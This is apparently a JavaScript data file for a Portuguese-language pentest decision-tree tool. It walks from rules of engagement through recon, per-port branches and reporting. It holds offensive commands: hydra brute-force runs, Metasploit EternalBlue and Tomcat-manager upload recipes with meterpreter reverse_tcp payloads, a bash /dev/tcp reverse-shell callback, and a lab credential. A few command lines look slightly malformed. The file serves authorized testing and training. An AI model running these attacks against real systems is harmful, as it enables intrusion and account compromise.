/**
 * Phantonite HUB — árvore de decisão do engajamento
 * Cada nó: id, phase, title, say, tone?, blocks[], choices[]
 */
window.HUNTER_PLAYBOOK = {
  meta: {
    name: "Phantonite HUB",
    version: "1.1.0",
    stack: ["gobuster", "wfuzz", "Burp Community", "rlwrap nc", "hydra", "john", "hashcat", "sqlmap", "msf"],
  },

  /* ordem do minimap */
  outline: [
    { id: "roe", label: "Escopo" },
    { id: "session", label: "Sessão" },
    { id: "alive", label: "Alvo vivo?" },
    { id: "trio", label: "Trio recon" },
    { id: "ports", label: "Mapa de portas", children: [
      { id: "web", label: "Web" },
      { id: "web-auth", label: "Auth" },
      { id: "tomcat", label: "Tomcat" },
      { id: "smb", label: "SMB" },
      { id: "ssh", label: "SSH" },
      { id: "ftp", label: "FTP" },
      { id: "rdp", label: "RDP" },
      { id: "mysql", label: "MySQL" },
      { id: "mssql", label: "MSSQL" },
      { id: "smtp", label: "SMTP" },
    ]},
    { id: "shell", label: "Shell" },
    { id: "report", label: "Report" },
  ],

  start: "roe",

  nodes: {
    /* ——— START PATH ——— */
    roe: {
      phase: "Briefing",
      title: "Antes de qualquer pacote",
      say: "Pentest autorizado ou estudo controlado — escopo claro antes do primeiro pacote.",
      blocks: [
        {
          title: "Checklist RoE",
          html: `<ul>
            <li><strong>Scope</strong> — hosts, apps, contas, redes in-scope; o que está <em>excluído</em></li>
            <li><strong>Targets</strong> — IPs/domínios/URLs confirmados (não “descobrir a empresa”)</li>
            <li><strong>Allowed</strong> — enum, auth testing, exploit <em>dentro</em> do combinado</li>
            <li><strong>Prohibited</strong> — DoS, fora de escopo, destrutivo sem OK explícito</li>
            <li><strong>Evidence</strong> — prova mínima, timestamps, sem exfil massiva</li>
            <li><strong>Lab (opcional)</strong> — se for THM/HTB/local, a box/VPN é o escopo; não é o default mental</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "RoE ok — armar a sessão", hint: "Variáveis no bash", to: "session" },
        { label: "Ainda sem escopo/alvo", hint: "Volta depois", to: "stop-roe" },
      ],
    },

    "stop-roe": {
      phase: "Setup",
      title: "Sem engajamento definido",
      say: "Sem scope/targets não há próximo passo técnico. Define autorização + alvo e volta.",
      blocks: [
        {
          title: "Mínimo pra recomeçar",
          html: `<ul>
            <li>Quem autorizou / qual janela</li>
            <li>Lista in-scope (e exclusões)</li>
            <li>Um target concreto (IP, URL ou app)</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Já tenho RoE — recomeçar", hint: "Volta ao briefing", to: "roe" },
      ],
    },

    session: {
      phase: "Setup",
      title: "Armar a sessão",
      say: "Exports no bash. Metasploit só quando o ramo pedir.",
      blocks: [
        {
          title: "Cola e ajusta",
          cmd: `export CLIENT="nome-do-cliente"
export IP="IP_DO_ALVO"
export DOMAIN="dominio.se.houver"
export TARGET="http://$IP"
export LHOST="TEU_IP_DE_ATAQUE"
export LPORT="443"
echo "Alvo: $IP | $TARGET | LHOST $LHOST:$LPORT"`,
          label: "bash",
          why: "Evita IP/LHOST errado nos cmds seguintes.",
        },
        {
          title: "Onde cada coisa vive",
          html: `<div class="table-wrap"><table>
            <tr><th>Ferramenta</th><th>Onde</th></tr>
            <tr><td>export, nmap, gobuster, curl, rlwrap nc</td><td>Terminal bash</td></tr>
            <tr><td>use / set / run / sessions</td><td>msfconsole</td></tr>
            <tr><td>Proxy / Repeater / history</td><td>Burp Community</td></tr>
          </table></div>`,
        },
      ],
      choices: [
        { label: "Sessão armada — ver se o alvo responde", hint: "ping + curl", to: "alive" },
      ],
    },

    alive: {
      phase: "Setup",
      title: "O alvo responde?",
      say: "Sanidade antes de scan. Não desperdiça nmap em rota morta.",
      blocks: [
        {
          title: "Checagem rápida",
          cmd: `ping -c 2 "$IP"
curl -sI "$TARGET"`,
          label: "bash",
        },
        {
          title: "Como ler",
          html: `<ul>
            <li><strong>Ping falhou, curl ok</strong> — normal (ICMP bloqueado). Segue.</li>
            <li><strong>Os dois falharam</strong> — VPN, IP ou rota. Não inicia o trio ainda.</li>
            <li><strong>curl com HTTPS quebrado</strong> — tenta <code>TARGET=https://…</code> ou <code>-k</code> só pra debug.</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Alvo alcançável — rodar o trio", hint: "dig + nmap + gobuster", to: "trio" },
        { label: "Não alcanço o alvo", hint: "Diagnóstico de rota", to: "dead-target" },
      ],
    },

    "dead-target": {
      phase: "Setup",
      title: "Sem rota até o alvo",
      say: "Antes de culpar a ferramenta, culpa a rede.",
      blocks: [
        {
          title: "Checklist",
          html: `<ul>
            <li><code>ip -4 addr show tun0</code> (VPN de lab/cliente up?)</li>
            <li>IP do room/cliente ainda válido?</li>
            <li>Ping no gateway da VPN</li>
            <li><code>TARGET</code> com esquema certo (http vs https)</li>
          </ul>`,
          cmd: `ip -4 addr show tun0
traceroute -n "$IP" | head`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Consertado — testar de novo", to: "alive" },
        { label: "Voltar ao briefing", to: "roe" },
      ],
    },

    trio: {
      phase: "Recon",
      title: "O trio: dig · nmap · gobuster",
      say: "Faz os três. Não escolhe favorito. Isso é o chão do engajamento.",
      blocks: [
        {
          title: "Dig (se houver domínio)",
          cmd: `dig "$DOMAIN" ANY +noall +answer
dig "$DOMAIN" NS +short
dig "$DOMAIN" MX +short
dig "$DOMAIN" TXT +short`,
          label: "bash",
          why: "Mapa DNS barato: mail, NS, TXT/SPF, nomes esquecidos. Em IP puro de lab, pula sem drama.",
        },
        {
          title: "Nmap — primeiro passe",
          cmd: `nmap -sV -sC "$IP"`,
          label: "bash",
          why: "-sV = versão. -sC = scripts default. Output no terminal; só usa -oA se for guardar evidência de verdade.",
        },
        {
          title: "Nmap — amplo (host único / janela ok)",
          cmd: `nmap -sV -sC -p- --min-rate $NMAP_MINRATE "$IP"`,
          label: "bash",
        },
        {
          title: "Nmap — scripts vuln (opcional)",
          cmd: `nmap --script vuln -sV -p PORTAS "$IP"`,
          label: "bash",
          why: "Barulhento e mais agressivo. Só com RoE ok — não é o primeiro pacote em produção sensível.",
        },
        {
          title: "Gobuster — cada HTTP",
          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40`,
          label: "bash",
          why: "Wordlist tu escolhe por engajamento. Outra porta web (8080, 1234)? Repete o gobuster nela.",
        },
      ],
      choices: [
        { label: "Li o nmap — escolher ramo por porta", hint: "Árvore de serviços", to: "ports" },
      ],
    },

    ports: {
      phase: "Decisão",
      title: "Mapa de portas — o que está aberto?",
      say: "Clica no que bate com a saída do nmap. Vários serviços? Faz um ramo, anota, volta aqui, abre o próximo.",
      blocks: [
        {
          title: "Atalho mental",
          html: `<ul>
            <li>Existe HTTP? <strong>Web primeiro</strong> na maioria dos engajamentos de app.</li>
            <li>Depois: serviço com <strong>versão antiga</strong> explícita.</li>
            <li>Brute só com RoE e rate consciente.</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "80 / 443 / 8080 / HTTP", hint: "Aplicação web", to: "web" },
        { label: "Login / Basic Auth / /login", hint: "Ramo de autenticação", to: "web-auth" },
        { label: "Tomcat /manager", hint: "Deploy / MSF", to: "tomcat" },
        { label: "445 / 139 · SMB", hint: "Shares, EternalBlue, psexec", to: "smb" },
        { label: "22 · SSH", hint: "Credencial", to: "ssh" },
        { label: "21 · FTP", hint: "Anonymous / upload", to: "ftp" },
        { label: "3389 · RDP", hint: "Exposição + cred", to: "rdp" },
        { label: "3306 · MySQL", hint: "DB exposto", to: "mysql" },
        { label: "1433 · MSSQL", hint: "SQL Server", to: "mssql" },
        { label: "25 / 587 · SMTP", hint: "Enum / relay", to: "smtp" },
        { label: "Já tenho RCE — preciso de shell", hint: "Listener", to: "shell" },
        { label: "Achado válido — reportar", hint: "Finding", to: "report" },
      ],
    },

    /* ——— WEB ——— */
    web: {
      phase: "Web",
      title: "Ramo Web",
      say: "HTTP(S). Mapa → enum → ataque. 401 Basic / pasta protegida = Auth (não SQLi). Slowloris / CVE-2007-6750 do nmap vuln = ignora.",
      blocks: [
        {
          title: "1. Browser + Burp",
          html: `<ul>
            <li>Scope = hosts in-scope</li>
            <li>Home, links, login, busca, upload</li>
            <li>Network → XHR/Fetch = API</li>
            <li>Inputs → notas</li>
          </ul>`,
        },
        {
          title: "2. Gobuster nesta URL",
          cmd: `gobuster dir -u "$TARGET/" -w $WORDLIST -t 40
curl -s "$TARGET/robots.txt"
# 401? confirma Basic Auth:
curl -sI "$TARGET/protected/"`,
          label: "bash",
          why: "http-enum do nmap pode ter listado /protected/ (401). curl -I → WWW-Authenticate: Basic.",
        },
        {
          title: "3. Parâmetro opaco → wfuzz (só se tiver endpoint)",
          cmd: `curl -s -o /dev/null -w '%{size_download}\\n' "$TARGET/endpoint?x=test"

wfuzz -c -z file,$WORDLIST_PARAMS --hh TAMANHO_NORMAL \\
  -u "$TARGET/endpoint?FUZZ=test"`,
          label: "bash",
          why: "Ajusta --hh/--hc ao tamanho da resposta baseline. Diferença = param existe → Repeater.",
        },
        {
          title: "4. SQLi (só com ponto já confirmado)",
          cmd: `sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM
# aprofundar:
sqlmap -u "$TARGET" $SQLMAP_OPTS -p $SQLMAP_PARAM`,
          label: "bash",
        },
        {
          title: "Não é foothold",
          html: `<ul>
            <li><strong>Slowloris / CVE-2007-6750</strong> e a lista vulners do Apache = DoS / CVE genérico. Em lab de foothold: <em>ignora</em> e segue o 401.</li>
            <li>Tomcat em outra porta (ex. 1234) = volta ao mapa → Tomcat /manager.</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "401 / Basic Auth / pasta protegida", hint: "/protected/ · hydra http-get", to: "web-auth" },
        { label: "Tem login form (POST)", to: "web-auth" },
        { label: "Tomcat /manager (outra porta)", to: "tomcat" },
        { label: "RCE / upload — preciso de callback", to: "shell" },
        { label: "Provei impacto — reportar", to: "report" },
        { label: "Voltar ao mapa de portas", to: "ports" },
      ],
    },

    "web-auth": {
      phase: "Web",
      title: "Ramo Auth",
      say: "WWW-Authenticate: Basic → hydra http-get. Form POST → http-post-form. Cred ok → remapear app / Nuclei com Header Basic.",
      blocks: [
        {
          title: "Basic Auth (pasta 401)",
          cmd: `# confirma
curl -sI "$TARGET/protected/"
# deve ter: WWW-Authenticate: Basic …

# brute curto primeiro — não rockyou × N users
hydra -L $USERS -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt \\
  -t $HYDRA_T -f "$IP" http-get /protected/

# teste manual
curl -sI -u 'USER:PASS' "$TARGET/protected/"`,
          label: "bash",
          why: "Path = o 401 real. 200 = sucesso. rockyou só com -l USER.",
        },
        {
          title: "Entrei — atrás do 401",
          cmd: `curl -s -u 'USER:PASS' "$TARGET/protected/" | head -n 80
gobuster dir -u "$TARGET/protected/" -w $WORDLIST -t 40 -U USER -P PASS

nuclei -u "$TARGET/protected/" \\
  -H "Authorization: Basic $(echo -n 'USER:PASS' | base64 -w0)" \\
  -t http/misconfiguration/ -t http/exposures/ -severity medium,high,critical`,
          label: "bash",
          why: "Mesmo user:pass no browser se pedir de novo.",
        },
        {
          title: "Form login (POST) — Manual no Burp",
          html: `<ul>
            <li>Captura o POST no Burp antes do hydra</li>
            <li>Página interna sem cookie?</li>
            <li>Cookie do user A na sessão B?</li>
            <li>Erro diferencia user vs senha? (= enum)</li>
            <li>SQLi no campo user — se quebrar, ramo SQLi</li>
          </ul>`,
        },
        {
          title: "Form login — Brute (RoE + rate)",
          cmd: `hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f \\
  "$IP" http-post-form \\
  "/login:email=^USER^&password=^PASS^:F=$HYDRA_FAIL"`,
          label: "bash",
          why: "A string F= tem que bater com a mensagem de falha real do app (olha no Burp).",
        },
      ],
      choices: [
        { label: "Entrei — Nuclei autenticado", hint: "Header Basic", to: "nuclei" },
        { label: "Entrei — remapear app autenticado", to: "web" },
        { label: "Cred/bypass = finding", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    tomcat: {
      phase: "Web",
      title: "Ramo Tomcat",
      say: "Versão: banner do nmap -sV (Tomcat/x.y.z, Coyote). Nikto só se o lab pedir 'documents'. Cred no /manager/html → msf tomcat_mgr_upload.",
      blocks: [
        {
          title: "Ler o que o nmap já spitou",
          html: `<ul>
            <li><code>Apache Tomcat/Coyote JSP engine 1.1</code> + header <code>Apache-Coyote/1.1</code> → Coyote</li>
            <li><code>http-title: Apache Tomcat/7.0.88</code> → server version (formato ******/x.y.z)</li>
            <li>Porta do manager = a do Tomcat (ex. 1234), não a 80</li>
            <li>Não roda Nikto/curl só pra “descobrir versão” se o -sV já mostrou</li>
          </ul>`,
        },
        {
          title: "Achar / confirmar manager",
          cmd: `curl -sI "http://$IP:PORTA/manager/html"
# 401 = Basic Auth no manager → hydra ou cred reusada do /protected/`,
          label: "bash",
        },
        {
          title: "Brute no manager (RoE) — se ainda sem cred",
          cmd: `hydra -L $USERS -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt \\
  -t $HYDRA_T -f "$IP" -s PORTA http-get /manager/html`,
          label: "bash",
          why: "Se já tem user:pass de outro 401 (ex. /protected/), testa antes: curl -sI -u 'USER:PASS' http://$IP:PORTA/manager/html",
        },
        {
          title: "Só se o lab exigir 'How many documents'",
          cmd: `nikto -h "http://$IP:$RPORT/manager/html" -id 'USER:PASS'
# rodapé: documentation files → quiz`,
          label: "bash",
        },
        {
          title: "Cred no manager?",
          cmd: `curl -sI -u 'USER:PASS' "http://$IP:$RPORT/manager/html"
# 200 = ok → MSF. 401 = cred errada / role sem manager-gui`,
          label: "bash",
          why: "ToolsRUs: bob:bubbles. RPORT = porta Tomcat (params).",
        },
        {
          title: "msfconsole",
          cmd: `msfconsole -q`,
          label: "bash → msf",
        },
        {
          title: "tomcat_mgr_upload",
          cmd: `search tomcat_mgr_upload
use exploit/multi/http/tomcat_mgr_upload
show options

set RHOSTS $IP
set RPORT $RPORT
set HttpUsername USER
set HttpPassword PASS
set LHOST $LHOST
set LPORT $LPORT

# Linux box típica:
set PAYLOAD linux/x64/meterpreter/reverse_tcp
# se falhar, tenta:
# set PAYLOAD java/meterpreter/reverse_tcp
# set PAYLOAD linux/x86/meterpreter/reverse_tcp

show options
run`,
          label: "msfconsole",
          why: "HttpUsername/Password = manager. Sem set RPORT certo (ex. 1234) o módulo bate na 80 e morre.",
        },
        {
          title: "Sessão caiu / falhou",
          html: `<ul>
            <li><code>LHOST</code> = tun0 (VPN), não eth0</li>
            <li>Payload errado pra arch → troca java/linux x86/x64</li>
            <li><code>sessions -l</code> / <code>sessions -i N</code></li>
            <li>Handler manual: ver ramo Metasploit</li>
          </ul>`,
        },
      ],
      choices: [
        { label: "Metasploit (hub)", to: "msf" },
        { label: "Sessão/shell", to: "shell" },
        { label: "Reportar manager", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— NETWORK SERVICES ——— */
    smb: {
      phase: "Rede",
      title: "Ramo SMB (445 / 139)",
      say: "Enum antes de exploit. EternalBlue só com OS velho (SMBv1 / Win7 / 2008).",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 139,445 --script smb-os-discovery,smb-security-mode,smb-enum-shares \\
  "$IP"

smbclient -L "//$IP/" -N`,
          label: "bash",
        },
        {
          title: "Stack velho? EternalBlue (RoE!)",
          cmd: `msfconsole -q`,
          label: "bash → msf",
          why: "Win7 / Server 2008 / SMBv1. Exploit pesado — confere escopo.",
        },
        {
          title: "No msf",
          cmd: `search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS IP_DO_ALVO
set LHOST TEU_LHOST
run`,
          label: "msfconsole",
        },
      ],
      choices: [
        { label: "Shell / meterpreter", to: "shell" },
        { label: "Share/info sensível — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    ssh: {
      phase: "Rede",
      title: "Ramo SSH (22)",
      say: "SSH moderno quase nunca é o CVE. É credencial (ou key).",
      blocks: [
        {
          title: "Versão + brute (RoE)",
          cmd: `nmap -sV -p 22 "$IP"
hydra -L $USERS -P $WORDLIST_PASS -t $HYDRA_T -f ssh://"$IP"
ssh user@"$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Acesso indevido — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    ftp: {
      phase: "Rede",
      title: "Ramo FTP (21)",
      say: "Anonymous primeiro. Sempre.",
      blocks: [
        {
          title: "Checagem",
          cmd: `nmap -sV -p 21 --script ftp-anon,ftp-syst "$IP"
ftp "$IP"
# user: anonymous
# pass: anonymous@`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Upload em dir web — ir pra shell", to: "shell" },
        { label: "Arquivos sensíveis — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    rdp: {
      phase: "Rede",
      title: "Ramo RDP (3389)",
      say: "Exposição + cred. Brute aqui trava conta fácil.",
      tone: "warn",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info "$IP"`,
          label: "bash",
        },
        {
          title: "Brute só com RoE explícito",
          cmd: `hydra -L $USERS -P $WORDLIST_PASS -t 1 -f rdp://"$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Reportar exposição / acesso", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    mysql: {
      phase: "Rede",
      title: "Ramo MySQL (3306)",
      say: "DB na rede = pergunta de superfície antes de dump.",
      blocks: [
        {
          title: "Enum + login",
          cmd: `nmap -sV -p 3306 --script mysql-info,mysql-empty-password,mysql-enum \\ "$IP"
mysql -h "$IP" -u root -p`,
          label: "bash",
        },
        {
          title: "Prova de acesso",
          cmd: `SHOW DATABASES;`,
          label: "mysql",
          why: "Prova impacto. Não dumpa o planeta sem necessidade do report.",
        },
      ],
      choices: [
        { label: "Reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    mssql: {
      phase: "Rede",
      title: "Ramo MSSQL (1433)",
      say: "Cred + módulos msf/Impacket. xp_cmdshell só se o RoE e o impacto pedirem.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 1433 --script ms-sql-info,ms-sql-empty-password \\ "$IP"
msfconsole -q
search mssql`,
          label: "bash / msf",
        },
      ],
      choices: [
        { label: "Consegui exec — shell", to: "shell" },
        { label: "Acesso a dados — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    smtp: {
      phase: "Rede",
      title: "Ramo SMTP (25 / 587)",
      say: "Users vazados alimentam SSH e login web. Relay aberto é finding sozinho.",
      blocks: [
        {
          title: "Enum",
          cmd: `nmap -sV -p 25,587 --script smtp-commands,smtp-enum-users \\
  --script-args smtp-enum-users.methods=VRFY \\ "$IP"`,
          label: "bash",
        },
      ],
      choices: [
        { label: "Users → testar SSH", to: "ssh" },
        { label: "Users → testar login web", to: "web-auth" },
        { label: "Relay/exposição — reportar", to: "report" },
        { label: "Mapa de portas", to: "ports" },
      ],
    },

    /* ——— CLOSEOUT ——— */
    shell: {
      phase: "Foothold",
      title: "Listener e shell",
      say: "Listener antes do payload. nc no bash; se o exploit foi MSF, usa a sessão/handler do msf.",
      blocks: [
        {
          title: "1. nc (fora do msf)",
          cmd: `rlwrap nc -lvnp "$LPORT"`,
          label: "bash",
        },
        {
          title: "2. Callback Linux (exemplo)",
          cmd: `bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'`,
          label: "alvo",
          why: "O vetor real é o exploit (cmdi, upload, msf). Isto é só o formato do reverse.",
        },
        {
          title: "3. TTY",
          cmd: `python3 -c 'import pty;pty.spawn("/bin/bash")'
# no nc: Ctrl-Z
stty raw -echo; fg
reset
export TERM=xterm`,
          label: "bash",
        },
        {
          title: "4. Meterpreter (se veio do msf)",
          cmd: `sessions -l
sessions -i 1
getuid
sysinfo
shell
# volta: exit / background
`,
          label: "msfconsole",
        },
        {
          title: "5. Evidência mínima",
          cmd: `id
hostname
pwd`,
          label: "shell",
        },
      ],
      choices: [
        { label: "Metasploit (hub)", to: "msf" },
        { label: "Documentar acesso", to: "report" },
        { label: "Ainda há portas no nmap", to: "ports" },
      ],
    },

    report: {
      phase: "Entrega",
      title: "Escrever o finding",
      say: "Escreve o finding. Se sobrar superfície, volta ao mapa.",
      blocks: [
        {
          title: "Template",
          cmd: `# [Critical|High|Medium|Low|Info] Título

**Asset:** URL / host / porta
**Como achou:** nmap → … / burp → …

## Resumo
2 frases.

## Impacto
O que o atacante faz.

## Repro
1. …
2. …

## Evidência
(print / nota)

## Correção
Controle objetivo.`,
          label: "findings/*.md",
        },
        {
          title: "Severidade rápida",
          html: `<div class="table-wrap"><table>
            <tr><th>Sev</th><th>Exemplo</th></tr>
            <tr><td>Critical</td><td>RCE, admin break, dump massivo</td></tr>
            <tr><td>High</td><td>Auth bypass, leitura sensível multi-user</td></tr>
            <tr><td>Medium</td><td>XSS stored com impacto, SSRF limitado</td></tr>
            <tr><td>Low/Info</td><td>Hardening, exposição sem abuso claro</td></tr>
          </table></div>`,
        },
      ],
      choices: [
        { label: "Próximo serviço do nmap", to: "ports" },
        { label: "Recomeçar engajamento", to: "roe" },
      ],
    },
  },
};
